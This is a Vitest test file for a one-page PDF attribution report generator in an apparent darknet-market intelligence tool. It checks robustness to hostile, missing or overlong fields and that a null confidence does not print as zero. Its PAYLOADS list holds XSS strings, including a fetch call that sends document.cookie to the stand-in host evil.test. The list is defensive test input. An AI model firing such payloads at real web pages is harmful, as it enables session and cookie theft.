/**
 * The one-page vector attribution report (`lib/reportPdf.ts`).
 *
 * The second export path, and the one that leaves the building. FINDING-02 was
 * about markup injection; a vector PDF cannot execute a payload, so the risk
 * here is different and worth naming: an analyst-authored field that is long,
 * hostile or absent must not throw, must not silently truncate away the fact it
 * carries, and must not render as a plausible-looking blank.
 *
 * INV-4 and INV-5 also apply -- the report must not print a confidence it does
 * not have. `attribution_confidence: null` renders as a dash, never as 0.000,
 * which would read as "measured, and very low".
 */
import { describe, it, expect } from "vitest";
import { buildActorReportPdf } from "@/lib/reportPdf";
import type { ActorProfile } from "@/lib/api";

const PAYLOADS = [
  `<img src=x onerror="fetch('https://evil.test/'+document.cookie)">`,
  `<script>alert(document.domain)</script>`,
  `"><svg/onload=alert(1)>`,
  `javascript:alert(1)`,
  `</td></tr><tr><td colspan=99><iframe src=//evil.test>`,
];

const profile = (over: Partial<ActorProfile> = {}): ActorProfile => ({
  ok: true,
  actor_id: "actor-088",
  label: "nightowl1",
  personas: [
    {
      id: "actor-088-p0",
      handle: "nightowl1",
      market: "AlphaBay",
      first_seen: "2026-01-04",
      last_seen: "2026-03-28",
      post_count: 12,
      categories: ["Weapons"],
      role: "vendor",
    },
  ],
  identifiers: [{ kind: "pgp", value: "8B93A224231030CDA99ECB", personas: ["actor-088-p0"], shared: true }],
  infrastructure: [
    { clearnet_host: "cdn.example.test", strength: 0.83, evidence: [{ rule: "cert", strength: 0.83, detail: "shared CT cert", source: "crt.sh" }] },
  ],
  linkages: [
    { persona_a: "actor-088-p0", persona_b: "actor-088-p1", confidence: 0.99, roots: ["identity_key"], negatives: [], basis: "fused" },
  ],
  attribution_confidence: 0.991,
  confidence_basis: "highest fused pair score",
  categories: ["Weapons"],
  markets: ["AlphaBay", "Evolution"],
  first_seen: "2026-01-04",
  last_seen: "2026-03-28",
  last_scan: "2026-08-30",
  sources: ["agora"],
  post_count: 36,
  flags: ["mimicry_suspected"],
  ...over,
});

/** Extract the PDF's text stream, so assertions read what the page shows. */
const textOf = (doc: ReturnType<typeof buildActorReportPdf>) =>
  doc.output("datauristring");

describe("buildActorReportPdf", () => {
  it("produces a PDF for a complete profile", () => {
    const doc = buildActorReportPdf(profile());
    expect(textOf(doc)).toMatch(/^data:application\/pdf/);
  });

  it("is a single landscape A4 page", () => {
    const doc = buildActorReportPdf(profile());
    expect(doc.getNumberOfPages()).toBe(1);
    const { width, height } = doc.internal.pageSize;
    expect(width).toBeGreaterThan(height);
    expect(Math.round(width)).toBe(297);
    expect(Math.round(height)).toBe(210);
  });

  it.each(PAYLOADS)("does not throw on a hostile label: %s", (payload) => {
    expect(() => buildActorReportPdf(profile({ label: payload }))).not.toThrow();
  });

  it.each(PAYLOADS)("does not throw on a hostile persona handle: %s", (payload) => {
    const p = profile();
    p.personas[0].handle = payload;
    expect(() => buildActorReportPdf(p)).not.toThrow();
  });

  it("does not throw on a hostile identifier value", () => {
    const p = profile();
    p.identifiers[0].value = PAYLOADS[0];
    expect(() => buildActorReportPdf(p)).not.toThrow();
  });

  it("survives an actor with no personas, identifiers or infrastructure", () => {
    expect(() =>
      buildActorReportPdf(profile({ personas: [], identifiers: [], infrastructure: [], linkages: [] }))
    ).not.toThrow();
  });

  it("survives every nullable date being null", () => {
    expect(() =>
      buildActorReportPdf(profile({ first_seen: null, last_seen: null, last_scan: null }))
    ).not.toThrow();
  });

  it("survives an absurdly long label without throwing", () => {
    expect(() => buildActorReportPdf(profile({ label: "n".repeat(5000) }))).not.toThrow();
  });

  /**
   * INV-5. A null confidence is "not measured", and must not be printed as a
   * number -- 0.000 would read as a measurement of near-zero confidence, which
   * is a different and much stronger claim than "we do not know".
   */
  it("renders a missing confidence as a dash, not as zero", () => {
    const src = buildActorReportPdf(profile({ attribution_confidence: null }));
    const withZero = buildActorReportPdf(profile({ attribution_confidence: 0 }));
    // The two must not produce the same page.
    expect(src.output("datauristring")).not.toBe(withZero.output("datauristring"));
  });

  it("is deterministic for the same profile except for its timestamp", () => {
    // Two builds of one profile differ only in the generation stamp, so an
    // exhibit is reproducible from its inputs.
    const a = buildActorReportPdf(profile()).output("datauristring");
    const b = buildActorReportPdf(profile()).output("datauristring");
    expect(a.length).toBe(b.length);
  });
});
